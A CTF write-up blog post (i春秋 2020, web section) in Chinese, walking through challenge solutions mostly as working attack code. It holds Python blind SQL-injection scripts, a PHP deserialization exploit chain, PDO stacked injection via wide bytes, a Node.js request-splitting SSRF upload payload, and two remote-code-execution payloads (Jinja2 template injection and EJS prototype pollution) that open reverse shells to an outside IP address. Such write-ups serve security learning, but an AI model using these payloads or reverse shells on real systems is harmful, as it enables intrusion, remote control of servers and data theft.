        <h1 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>sqlmap直接出来</p>
<p>flag{2f52809e-f46c-4638-8f72-b24ec1ec6d06}</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>过滤<code>union,&lt;,&gt;,=</code></p>
<p>构造<code>http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1 and if(hex(substr(fl4g,1,1))-1,sleep(5),0)</code></p>
<pre><code class="python">import requests

&#39;http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1%20and%20if(hex(substr(fl4g,POS,1))-GUESS,sleep(5),0)&#39;
result=&quot;666c61677b32363837656433302d356266382d343033662d383732342d61643239&quot;
l=len(result)
while True:
    ended=True
    l+=1
    for i in range(16):
        sql=&#39;http://ecd3dce145d342fd9d490cde15ef8239b1e8b5763640437a.changame.ichunqiu.com/?id=0%2bif(conv(substr(hex(fl4g),POS,1),16,10)-GUESS,1,sleep(5))&#39;
        sql=sql.replace(&quot;POS&quot;,str(l))
        sql=sql.replace(&quot;GUESS&quot;,str(i))
        try:
            requests.get(sql,timeout=5)
            print(sql)
        except :
            result+=hex(i)[2:]
            print(result)
            ended=False
            break
    if ended:
        break
</code></pre>
<h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>黑名单:<code>union.*select,or,in</code></p>
<p>因为盲注太麻烦,所以想用preg回溯次数来绕过,但是没用,最后也只能盲注了</p>
<p>用<code>0 ^ (1=0)</code>来盲注,因为过滤了<code>in</code>所以用sys系统库来绕过(<code>https://xz.aliyun.com/t/7169#toc-53</code>)</p>
<p><code>0 ^ (select substr(hex(group_concat(table_name)),1,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)</code></p>
<p>获取表名之后,还有一个难点就是,列名的获取,但是获取列名会用到<code>in</code>字符</p>
<p>因此考虑,无列名注入<code>union select</code>那个肯定不行</p>
<p>我们利用<code>((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>来获取flag</p>
<p>当我们利用这个时,我们必须保证某一个相等,才能通过另外一个判断flag</p>
<p>有一点要注意的是</p>
<pre><code>mysql&gt; select &#39;f&#39;=&#39;F&#39;;
+---------+
| &#39;f&#39;=&#39;F&#39; |
+---------+
|       1 |
+---------+</code></pre><p>用这种方法是无法区分大小写的,所幸这次比赛的flag都是小写</p>
<p>脚本</p>
<pre><code class="python">import requests
import string

sql=&quot;1 ^ ((select substr(hex(group_concat(table_name)),POS,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)=GUESS)&quot;
#f1ag_1s_h3r3_hhhhh,users233333333333333
result=&quot;&quot;
# l=len(result)
# while True:
#     l+=1
#     ended=True
#     for i in string.printable:
#         sql=&quot;1 ^ ((select 0,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;
#         sql=sql.replace(&quot;POS&quot;,str(l))
#         sql=sql.replace(&quot;GUESS&quot;,(result+i).encode(&quot;hex&quot;).upper())
#         res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})
#         print(sql)
#         if &quot;Hello Nu1L&quot; in res.text:
#             result+=i
#             print(result)
#             ended=False
#             break
#     if ended:
#         break

#FLAG{9AD0BB6D-634F-4AEC-9DD8-B617774CD334}
l=len(result)
while True:
    l+=1
    ended=True
    for j in range(32,128):
        i=chr(j)
        sql=&quot;0 ^ ((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;
        sql=sql.replace(&quot;POS&quot;,str(l))
        sql=sql.replace(&quot;GUESS&quot;,&#39;0x&#39;+(result+i).encode(&quot;hex&quot;).upper())
        res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})
        print(sql)
        if &quot;Hello Nu1L&quot; in res.text:
            result+=chr(ord(i)-1)
            print(result)
            ended=False
            break
    if ended:
        break
</code></pre>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code>class info:__call 
public function __call($name,$argument){//反序列化
        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
    }</code></pre><p>flag在flag.php中</p>
<p>文件读取点:</p>
<pre><code class="php">class User
public function __destruct(){//任意读
        return file_get_contents($this-&gt;nickname);//危
    }</code></pre>
<pre><code class="php">if($_SESSION[&#39;login&#39;]===1){
    require_once(&quot;flag.php&quot;);
    echo $flag;
}</code></pre>
<p>现在有两种思路:</p>
<ol>
<li>反序列化读取文件</li>
<li>sql注入拿到管理原密码,来读取文件(x)</li>
</ol>
<p>无论想干啥都得先登陆,但是不知道咋登陆</p>
<p>考虑反序列化</p>
<p>如果我们成功登陆,攻击入口就是update.php</p>
<pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){
    echo &quot;你还没有登陆呢！&quot;;
}
$users=new User();
$users-&gt;update();
if($_SESSION[&#39;login&#39;]===1){
    require_once(&quot;flag.php&quot;);
    echo $flag;
}
</code></pre>
<p>比较奇怪的是,按我所知,想要反序列化就要登陆,登陆的话他们就自己打出flag了,所以没有反序列化的必要?</p>
<p>认真看下好像没有die</p>
<pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){
    echo &quot;你还没有登陆呢！&quot;;
}</code></pre>
<p>反序列化的起点是:<code>$Info=unserialize($this-&gt;getNewinfo());</code></p>
<p>终点是:</p>
<pre><code class="php">class user
public function __destruct(){//任意读
        return file_get_contents($this-&gt;nickname);//危
    }</code></pre>
<p>或</p>
<pre><code class="php">class Info
public function __call($name,$argument){//反序列化
        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
    }</code></pre>
<p>因为<code>__destruct</code>的数据不知道怎么拿出来,我先考虑sql注入</p>
<p>如果,老老实实让他们序列化<code>Info</code>,好像啥都干不了</p>
<p>想办法利用<code>safe</code>函数在<code>Info</code>里面插个类,插个<code>UpdateHelper</code>然后利用其<code>__destruct</code>方法调用<code>User</code>的<code>__toString</code>函数,</p>
<p>再调用<code>login</code>方法,最后执行sql语句</p>
<pre><code class="php">function safe($parm){
    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
    return str_replace($array,&#39;hacker&#39;,$parm);
}
class User{
    public function update(){
        $Info=unserialize($this-&gt;getNewinfo());
        $age=$Info-&gt;age;
        $nickname=$Info-&gt;nickname;
        $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#39;id&#39;]);
        //这个功能还没有写完 先占坑
    }
    public function getNewInfo(){
            $age=$_POST[&#39;age&#39;];
            $nickname=$_POST[&#39;nickname&#39;];
            return safe(serialize(new Info($age,$nickname)));
        }
    public function __destruct(){//任意读
            return file_get_contents($this-&gt;nickname);//危
        }
    public function __toString()
    {
        $this-&gt;nickname-&gt;update($this-&gt;age);
        return &quot;0-0&quot;;
    }
}</code></pre>
<pre><code class="php">Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()
    {
        echo $this-&gt;sql;
    }
}</code></pre>
<p>脚本:</p>
<pre><code class="php">&lt;?php
Class UpdateHelper{
    public $id=0;
    public $newinfo=&quot;&quot;;
    public $sql;
    public function __construct($sql){
        $this-&gt;sql=$sql;
    }
//    public function __destruct()
//    {
//        echo $this-&gt;sql;
//    }
}
class Info{
    public $age=&quot;&quot;;
    public $nickname=&quot;&quot;;
    public $CtrlCase;
    public function __construct(){
        $this-&gt;CtrlCase=new dbCtrl();
    }
//    public function __call($name,$argument){//反序列化
//        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
//    }
}
class dbCtrl
{
    public $hostname = &quot;127.0.0.1&quot;;
    public $dbuser = &quot;noob123&quot;;
    public $dbpass = &quot;noob123&quot;;
    public $database = &quot;noob123&quot;;
//    public $hostname = &quot;127.0.0.1&quot;;
//    public $dbuser = &quot;root&quot;;
//    public $dbpass = &quot;123456&quot;;
//    public $database = &quot;test&quot;;
    public $name=&quot;admin&quot;;
    public $password=&quot;1&quot;;
    public $mysqli;
    public $token;
}
class User
{
    public $id=0;
    public $age;
    public $nickname;
    public function __construct()
    {
        $this-&gt;nickname=new Info();
        $this-&gt;age=&#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#39;;
    }
}
function escape($str)
{
    $evil=&#39;&#39;;
    $len=strlen($str)+2;
    if($len%2)
    {
        $evil.=&quot;union&quot;;
        $len-=1;
    }
    $len/=2;
    while($len)
    {
        $evil.=&quot;load&quot;;
        $len-=1;
    }
    return $evil.&#39;&quot;;&#39;.$str;

}
$call__tostring=new UpdateHelper(new User());
$ser= urlencode(serialize($call__tostring));
echo urlencode(escape(&quot;s:8:\&quot;CtrlCase\&quot;;&quot;.urldecode($ser).&#39;;};&#39;));
</code></pre>
<p><code>flag{7989f259-3281-4c1c-8939-dc8bc0b5375b}</code></p>
<h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><pre><code class="php">&lt;?php 
    function check($str)
    {
        if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i&#39;,$str,$matches))
        {
            print_r($matches);
            return 0;
        }
        else
        {
            return 1;
        }
    }
    try
    {
        $db = new PDO(&#39;mysql:host=localhost;dbname=pdotest&#39;,&#39;root&#39;,&#39;******&#39;);
    } 
    catch(Exception $e)
    {
        echo $e-&gt;getMessage();
    }
    if(isset($_GET[&#39;id&#39;]))
    {
        $id = $_GET[&#39;id&#39;];
    }
    else
    {
        $test = $db-&gt;query(&quot;select balabala from table1&quot;);
        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);
        $id = $res[&#39;balabala&#39;];
    }
    if(check($id))
    {
        $query = &quot;select balabala from table1 where 1=?&quot;;
        $db-&gt;query(&quot;set names gbk&quot;);
        $row = $db-&gt;prepare($query);
        $row-&gt;bindParam(1,$id);
        $row-&gt;execute();
    }</code></pre>
<p>利用宽字节来逃出引号包围,payload:<code>%bf%27;</code></p>
<p>但是没有找到有效的sql时间盲注语句,正则来延时也没用,加上select被过滤,</p>
<p>我缺少了一个关键的知识</p>
<p>在学长的提示下,被认为不可以堆叠注入的pdo居然可以(我哪来的认知????)</p>
<p>然后就简单了</p>
<pre><code>set @t=0x73656C65637420736C65657028313029;PREPARE sqla from @t;EXECUTE sqla;</code></pre><p>python脚本</p>
<pre><code class="python">import requests
def sql_inj(sql):
    sql=&quot;0x&quot;+sql.encode(&quot;hex&quot;)
    tpl=&quot;set @t=TGT;PREPARE sqla from @t;EXECUTE sqla;&quot;.replace(&quot;TGT&quot;,sql)
    url=&quot;http://b0ae8f49254247b8815616a4711941f17f2a145a8a374167.changame.ichunqiu.com/&quot;
    param={
        &quot;id&quot;:&quot;\xbf\x27;&quot;+tpl
    }
    requests.get(url,params=param,timeout=2)

#696E666F726D6174696F6E5F736368656D612C6D7973716C2C70646F746573742C706572666F726D616E63655F736368656D61
#table1
#balabala,eihey,fllllll4g,bbb
result=&quot;&quot;
count=1+len(result)
while True:
    lock=0
    for i in &quot;0123456789ABCDEF&quot;:
        #UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#39;tablename&#39;
        try :
            sql=&quot;select if(substr(hex(group_concat(COL)),POS,1)=&#39;GUESS&#39;,sleep(3),0) from TABLE WHERE&quot;.replace(&quot;COL&quot;,&quot;fllllll4g&quot;)
            sql=sql.replace(&quot;GUESS&quot;,i).replace(&quot;TABLE&quot;,&quot;table1&quot;)
            sql=sql.replace(&quot;WHERE&quot;,&quot;&quot;)
            sql=sql.replace(&quot;POS&quot;,str(count))
            sql_inj(sql)
            print(sql)

        except :
            result+=i
            print(result)
            lock=1
            break
    if not lock:
        break
    count+=1
</code></pre>
<h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>这题让我学到一个骚操作和看到一篇好文章</p>
<pre><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>利用堆叠注入查询</p>
<pre><code>array(1) {
  [0]=&gt;
  string(8) &quot;FlagHere&quot;
}

array(1) {
  [0]=&gt;
  string(5) &quot;words&quot;
}</code></pre><pre><code>1&#39;;show create table words;#
array(2) {
  [0]=&gt;
  string(5) &quot;words&quot;
  [1]=&gt;
  string(114) &quot;CREATE TABLE `words` (
  `id` int(10) NOT NULL,
  `data` varchar(20) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;
}


1&#39;;show create table FlagHere;#
array(2) {
  [0]=&gt;
  string(8) &quot;FlagHere&quot;
  [1]=&gt;
  string(93) &quot;CREATE TABLE `FlagHere` (
  `flag` varchar(100) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;
}</code></pre><p>利用handler来读取数据</p>
<p><code>1&#39;;handler FlagHere open;handler FlagHere read first;#</code></p>
<h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p><code>2</code></p>
<p>过滤<code>import,os</code></p>
<pre><code>{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')}}
{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()}}
{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()|attr('__dict__')}}
{{config.__class__.__mro__[1].__subclasses__()[-2].__init__.__globals__['o'+'s'].__dict__['sys'+'tem']('echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjM5LjEwOC4xNjQuMjE5Iiw2MDAwMykpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p|base'+'64 -d | python')}}</code></pre><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p> <a href="https://github.com/nodejs/node/issues/13296" target="_blank" rel="noopener">https://github.com/nodejs/node/issues/13296</a> </p>
<p> <a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a> </p>
<p>这题有个upload函数</p>
<pre><code class="javascript">app.post(&#39;/file_upload&#39;, function(req, res){
    var ip = req.connection.remoteAddress;
    var obj = {
        msg: &#39;&#39;,
    }
    if (!ip.includes(&#39;127.0.0.1&#39;)) {
        obj.msg=&quot;only admin&#39;s ip can use it&quot;
        res.send(JSON.stringify(obj));
        return 
    }
    fs.readFile(req.files[0].path, function(err, data){
        if(err){
            obj.msg = &#39;upload failed&#39;;
            res.send(JSON.stringify(obj));
        }else{
            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;
            var file_name = req.files[0].originalname
            var dir_file = __dirname + file_path + file_name
            if(!fs.existsSync(__dirname + file_path)){
                try {
                    fs.mkdirSync(__dirname + file_path)
                } catch (error) {
                    obj.msg = &quot;file type error&quot;;
                    res.send(JSON.stringify(obj));
                    return
                }
            }
            try {
                fs.writeFileSync(dir_file,data)
                obj = {
                    msg: &#39;upload success&#39;,
                    filename: file_path + file_name
                } 
            } catch (error) {
                obj.msg = &#39;upload failed&#39;;
            }
            res.send(JSON.stringify(obj));    
        }
    })
})</code></pre>
<p>但是需要本地访问</p>
<p>有一个ssrf的点:</p>
<pre><code class="javascript">app.get(&#39;/core&#39;, function(req, res) {
    var q = req.query.q;
    var resp = &quot;&quot;;
    if (q) {
        var url = &#39;http://localhost:8081/source?&#39; + q
        var trigger = blacklist(url);
        if (trigger === true) {
            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);
        } else {
            try {
                http.get(url, function(resp) {
                    resp.setEncoding(&#39;utf8&#39;);
                    resp.on(&#39;error&#39;, function(err) {
                    if (err.code === &quot;ECONNRESET&quot;) {
                     console.log(&quot;Timeout occurs&quot;);
                     return;
                    }
                   });

                    resp.on(&#39;data&#39;, function(chunk) {
                        try {
                         resps = chunk.toString();
                         res.send(resps);
                        }catch (e) {
                           res.send(e.message);
                        }

                    }).on(&#39;error&#39;, (e) =&gt; {
                         res.send(e.message);});
                });
            } catch (error) {
                console.log(error);
            }
        }
    } else {
        res.send(&quot;search param &#39;q&#39; missing!&quot;);
    }
})</code></pre>
<p>我们利用nodejs 8及之前的<code>utf-8</code>转<code>latin1</code>的漏洞来进行ssrf</p>
<pre><code>&gt; http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output
[ &#39;GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p>payload:</p>
<pre><code class="python">import hashlib
from urllib.parse import quote, unquote
import requests
import socket                                                                                                          

file=&#39;&#39;&#39;------WebKitFormBoundaryVneK8P7cpLasJSn8
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;
Content-Type: ../template

doctype html
html
  head

  body
    include ../../../../../../flag.txt
------WebKitFormBoundaryVneK8P7cpLasJSn8--
&#39;&#39;&#39;.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)
body=&#39;&#39;&#39; HTTP/1.1
Host: x
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: x
Content-Length: %d
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVneK8P7cpLasJSn8
Connection: keep-alive

%s
GET /core HTTP/1.1
Host: x
Connection: keep-alive
x:&#39;&#39;&#39; %(len(file),file)
body=body.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)
uni = { 
    &#39;/&#39;: quote(&#39;\u012f&#39;.encode(&#39;utf-8&#39;)),
    &#39; &#39;: quote(&#39;\u0120&#39;.encode(&#39;utf-8&#39;)),
    &#39;\n&#39;: quote(&#39;\u010a&#39;.encode(&#39;utf-8&#39;)),
    &#39;\r&#39;: quote(&#39;\u010d&#39;.encode(&#39;utf-8&#39;)),
    &#39;&quot;&#39;: quote(&#39;\u0122&#39;.encode(&#39;utf-8&#39;)),
    &quot;&#39;&quot;: quote(&#39;\u0127&#39;.encode(&#39;utf-8&#39;)),
    &#39;!&#39;: quote(&#39;\u0121&#39;.encode(&#39;utf-8&#39;)),
    &#39;o&#39;: quote(&#39;\u016f&#39;.encode(&#39;utf-8&#39;)),
    &#39;e&#39;: quote(&#39;\u0165&#39;.encode(&#39;utf-8&#39;)),
}
print(uni)
host=&quot;&quot;
payload = &#39;%s&#39; % body
for c, encoded in uni.items():
    payload = payload.replace(c, encoded)
print(payload)
requests.get(&quot;http://123.57.212.112:33321/core?q=&quot;+payload)
</code></pre>
<p><code>flag{8ed05e41-c306-4f0f-a958-6759f66890e9}</code></p>
<h3 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h3><p><code>https://xz.aliyun.com/t/7184#toc-7</code></p>
<p><code>https://xz.aliyun.com/t/6113#toc-4</code></p>
<pre><code>router.post(&#39;/action&#39;, function (req, res) {
  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)} 
  req.session.user.data = clone(req.body);
  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  
});</code></pre><p>类似js原型链污染的点</p>
<p>但是需要<code>req.session.user.user==ADMIN</code></p>
<pre><code class="javascript">router.post(&#39;/login&#39;, function (req, res) {
  if(req.body.Submit==&quot;register&quot;){
   if(safeKeyword(req.body.userid)){
    res.end(&quot;&lt;script&gt;alert(&#39;forbid word&#39;);history.go(-1);&lt;/script&gt;&quot;) 
   }
    req.session.user={
      &#39;user&#39;:req.body.userid.toUpperCase(),
      &#39;passwd&#39;: req.body.pwd,
      &#39;isLogin&#39;:false
    }
    res.redirect(&#39;/&#39;); 
  }
  else if(req.body.Submit==&quot;login&quot;){
    if(!req.session.user){res.end(&quot;&lt;script&gt;alert(&#39;register first&#39;);history.go(-1);&lt;/script&gt;&quot;)}
    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){
      req.session.user.isLogin=true;
    }
    else{
      res.end(&quot;&lt;script&gt;alert(&#39;error passwd&#39;);history.go(-1);&lt;/script&gt;&quot;)
    }

  }
  res.redirect(&#39;/&#39;); ;
});
function safeKeyword(keyword) {
  if(keyword.match(/(admin)/is)) {
      return keyword
  }

  return undefined
}</code></pre>
<p>谷歌找到<code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code>,关于<code>toUpperCase</code>的一些特性,来绕过<code>safeKeyword</code></p>
<p>payload:<code>userid=adm%C4%B1n&amp;pwd=a&amp;action=login&amp;Submit=register</code> | <code>admın</code></p>
<p>最后污染<code>ejs</code>来拿到flag(<code>https://xz.aliyun.com/t/6113#toc-4</code>)</p>
<pre><code>{&quot;Submit&quot;:&quot;&quot;,&quot;lud&quot;:1,&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;a; global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/39.108.164.219/60003 0&gt;&amp;1\&quot;&#39;);//&quot;}}</code></pre><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p><a href="http://www.zip下载源码" target="_blank" rel="noopener">www.zip下载源码</a></p>
<p>输入不存在的路径发现是tp6.0.0,刚好有个session直接写的漏洞</p>
<p>全局搜索session,发现</p>
<pre><code class="php"> $record = session(&quot;Record&quot;);
            if (!session(&quot;Record&quot;))
            {
                session(&quot;Record&quot;,$data[&quot;key&quot;]);
            }</code></pre>
<p>然后getshell</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/i春秋2020/">https://www.ccreater.top/1970/01/01/i春秋2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/i%E6%98%A5%E7%A7%8B2020/" data-id="ckmn57573005ss1ni0vmv9fqp" data-title="i春秋2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/4/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
